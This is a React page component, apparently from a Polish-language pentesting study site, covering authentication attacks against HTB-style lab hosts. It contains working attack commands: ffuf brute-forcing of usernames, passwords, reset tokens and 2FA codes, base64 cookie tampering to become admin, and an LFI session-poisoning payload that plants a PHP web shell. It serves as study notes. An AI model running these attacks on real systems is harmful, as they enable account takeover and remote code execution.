import { Link } from 'react-router-dom';
import authentication_error from '../../../assets/authentication_error.png';
import authentication_register_password_rule from '../../../assets/authentication_register_password_rule.png';
import authentication_reset_token from '../../../assets/authentication_reset_token.png';
import authentication_session_token from '../../../assets/authentication_session_token.png';
import authentication_session_fixed from '../../../assets/authentication_session_fixed.png';
import authentication_trafic from '../../../assets/authentication_trafic.png';
import authentication_session_db from '../../../assets/authentication_session_db.png';
import ExampleFrame from '../../exampleFrame/ExampleFrame';

const Authentication = () => {

    return(
        <section>
            <h1>Authentication</h1>


            <table>
                <thead>
                    <tr>
                        <th className='half'>Autentykacja</th>
                        <th>Autoryzajca</th>
                    </tr>
                </thead>
                <tbody>
                    <tr>
                        <td>Określa, czy użytkownicy są tym, za kogo się podają</td>
                        <td className='important'>Określa, do czego użytkownicy mogą, a do czego nie mogą uzyskać dostępu</td>
                    </tr>
                    <tr>
                        <td>Wymaga potwierdzenia przez użytkownika, aby zweryfikował dane uwierzytelniające (na przykład za pomocą haseł, odpowiedzi na pytania zabezpieczające lub rozpoznawania twarzy)</td>
                        <td className='important'>Sprawdza, czy dostęp jest dozwolony poprzez zasady i reguły</td>
                    </tr>
                    <tr>
                        <td>Zwykle robione przed autoryzacją</td>
                        <td className='important'>Zwykle wykonywane po pomyślnym uwierzytelnieniu</td>
                    </tr>
                    <tr>
                        <td>Zwykle wymaga danych logowania użytkownika</td>
                        <td className='important'>Wymaga uprawnień użytkowników lub poziomów bezpieczeństwa</td>
                    </tr>
                    <tr>
                        <td>Ogólnie rzecz biorąc, przesyła informacje za pośrednictwem tokenu identyfikacyjnego</td>
                        <td className='important'>Przesyła informacje za pośrednictwem tokenu dostępu</td>
                    </tr>
                </tbody>
            </table>

            <h2>Enumerating Users via Differing Error Messages Enumeracja użytkowników przez komunikaty o błędach</h2>

            <ExampleFrame screen={authentication_error}/>

            <p>Możemy zauważyć że przy różnych błędnych danych otrzymujemy inne komunikaty o będach, które możemy wykorzystać do enumeracji</p>

            <div className='waring'>
                <p>{`ffuf -w ./seclist/xato-net-10-million-usernames.txt -u http://<TARGER IP>/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=FUZZ&password=invalid" -fr "Unknown user"`}</p>
            </div>

            <p>Możemy sprawdzić strone logowaia czy nie mamy podanych danych jakie są wymagania odnośnie hasła do konta</p>
            <ExampleFrame screen={authentication_register_password_rule}/>

            <div className='waring'>
                <p>{`grep '[[:upper:]]' /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt | grep '[[:lower:]]' | grep '[[:digit:]]' | grep -E '.{10}' > custom_wordlist.txt`}</p>
            </div>

            <p>Wymuszamy komunikat błedu do poprawnego użytkownika by wykorzystać komunikat o błędach do enumeracji hasła</p>

            <div className='waring'>
                <p>ffuf -w ./custom_wordlist.txt -u http://{`<TARGET IP>`}/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=admin&password=FUZZ" -fr "Invalid username"</p>
            </div>

            <hr />

            <h2>Identyfikowanie słabych tokenów resetowania</h2>
            <ExampleFrame screen={authentication_reset_token}/>

            <h3>Przykład maila resetujące hasło</h3>

            <div className='waring'>
                <p>Hello,</p>
                <p>We have received a request to reset the password associated with your account. To proceed with resetting your password, please follow the instructions below:</p>
                <p>1. Click on the following link to reset your password: Click</p>
                <p>2. If the above link doesn't work, copy and paste the following URL into your web browser: <span className='important'>http://weak_reset.htb/reset_password.php?token=7351</span></p>
                <p>Please note that this link will expire in 24 hours, so please complete the password reset process as soon as possible. If you did not request a password reset, please disregard this e-mail.</p>
                <p>Thank you.</p>
            </div>
        
            <p>Możemy stworzyć listę 4-cyfrowych liczb</p>
            <div className='waring'>
                <p>{`seq -w 0 9999 > tokens.txt`}</p>
            </div>
            <div className='waring'>
                <p>{`ffuf -w ./tokens.txt -u http://weak_reset.htb/reset_password.php?token=FUZZ -fr "The provided token is invalid"`}</p>
            </div>

            <p>Tak samo w przypadku Two-Factor Authentication (2FA)</p>

            <div className='waring'>
                <p>{`ffuf -w ./tokens.txt -u http://bf_2fa.htb/2fa.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -b "PHPSESSID=fpfcm5b8dh1ibfa7idg0he7l93" -d "otp=FUZZ" -fr "Invalid 2FA Code"`}</p>
            </div>

            <hr />
            <h2>Domyślne hasła</h2>
            <p><Link to='https://www.cirt.net/passwords'>Lista serwisów z domyślnymi hasłami</Link></p>
            <p><Link to='https://github.com/scadastrangelove/SCADAPASS/blob/master/scadapass.csv'>Lista serwisów z domyślnymi hasłami</Link></p>
            <Link to='https://github.com/FilipowiczP/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv'>Lista serwisów z domyślnymi hasłami - SecLists</Link>

            <hr />

            <h2>Atakowanie token sesji</h2>

            <p>Często tokeny są generowane wg prostego wzoru i są one zaszyfrowane np:</p>
        
            <p className='important'>2c0c58b27c71a2ec5bf2b4<span className='waring'>b6e8</span>92b9f9</p>
            <p className='important'>2c0c58b27c71a2ec5bf2b4<span className='waring'>5460</span> 92b9f9</p>
            <p className='important'>2c0c58b27c71a2ec5bf2b4<span className='waring'>97f5</span>92b9f9</p>
            <p className='important'>2c0c58b27c71a2ec5bf2b4<span className='waring'>8bcf</span>92b9f9</p>
            <p className='important'>2c0c58b27c71a2ec5bf2b4<span className='waring'>735e</span>92b9f9</p>

            <ExampleFrame screen={authentication_session_token}/>
            <div className='waring'>
                <p>{`echo -n dXNlcj1odGItc3RkbnQ7cm9sZT11c2Vy | base64 -d`}</p>
            </div>

            <div className='waring'>
                <p>{`echo -n 'user=htb-stdnt;role=admin' | base64`}</p>
            </div>

            <hr />
            <h2>Zatrucie sesji PHP</h2>

            <div className='waring'>
                <p>Szczegóły te są przechowywane w plikach sesji na zapleczu i zapisane w <span className='important'>/var/lib/php/sessions/</span> w systemie Linux oraz w <span className='important'>C:\Windows\Temp\</span> w systemie Windows. Nazwa pliku zawierającego dane naszego użytkownika odpowiada nazwie naszego pliku cookie PHPSESSID z prefiksem <span className='important'>sess_</span>. Na przykład, jeśli plik cookie PHPSESSID jest ustawiony na <span className='important'>el4ukv0kqbvoirg7nkp4dncpk3</span>, jego lokalizacja na dysku będzie wynosić <span className='important'>/var/lib/php/sessions/sess_el4ukv0kqbvoirg7nkp4dncpk3.</span></p>
            </div>

            <div className='waring'>
                <p>http://{`<SERVER_IP>:<PORT>`}/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E</p>
                <p>PHPSESSID zostało zatrute</p>
                <p>Ponownie wykorzystujemy zatruty plik sess_ </p>
                <p>http://{`<SERVER_IP>:<PORT>`}/index.php?language=<span className='important'>/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd</span><span className='error'>&cmd=id</span></p>
            </div>
            <hr />
            <h2>Przejmowanie sesji (Session Hijacking)</h2>
            <p>Polega na przejęciu sesji ofiary i ustawienie jako swojej by zalogować się bez logowania</p>

            <h2>Utrwalanie sesji (Session Fixation)</h2>
            <p>Polega na przesłaniu ofierze url z zatrutym przez nas tokenem</p>
            <div className='waring'>
                <p><span className='important'>http://oredirect.htb.net/?redirect_uri=/complete.html&token={`<RANDOM TOKEN VALUE>`}</span></p>
            </div>
            <ExampleFrame screen={authentication_session_fixed}/>

            <h2>Nasłuchiwanie ruchu (Traffic Sniffing)</h2>
            <ExampleFrame screen={authentication_trafic}/>
            <h2>Uzyskiwanie identyfikatorów sesji po wykorzystaniu</h2>
            <h3>PHP</h3>
            <p>Wpis <span className='important'>session.save_path w PHP.ini</span> określa, gdzie będą przechowywane dane sesji.</p>
            <div className='waring'>
                <p>locate php.ini</p>
                <p>cat /etc/php/7.4/cli/php.ini | grep 'session.save_path'</p>
                <p>cat /etc/php/7.4/apache2/php.ini | grep 'session.save_path'</p>
            </div>
            <p>W naszym <span className='important'>domyślnym</span> przypadku konfiguracji jest to <span className='important'>/var/lib/php/sessions</span>. Pamiętaj, że ofiara musi zostać uwierzytelniona, abyśmy mogli zobaczyć jej identyfikator sesji. Pliki, które będzie wyszukiwał atakujący, mają konwencję nazw <span className='important'>{`sess_<sessionID>`}</span>.</p>
            <h3>Bazy danych</h3>
            <ExampleFrame screen={authentication_session_db}/>
        </section>
    )
};

export default Authentication;